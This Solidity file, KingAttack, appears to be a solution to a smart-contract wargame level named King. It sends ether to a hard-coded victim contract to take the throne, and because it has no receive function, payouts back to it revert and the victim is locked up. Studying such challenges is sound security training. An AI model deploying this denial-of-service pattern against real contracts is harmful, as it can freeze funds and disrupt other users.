// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./King.sol";

contract KingAttack{
    King victim;
    constructor()public{
        victim = King(0x20fF4CAf3a65b1705b8F24f5c68B7283Bf712791);
    }

    function gePrizeAmount() public view returns (uint256){
        return victim.prize();
    }

    function attack()public payable{
        (bool success, ) = address(victim).call{value:msg.value}("");
        require(success, "Ecks deee");
    }
}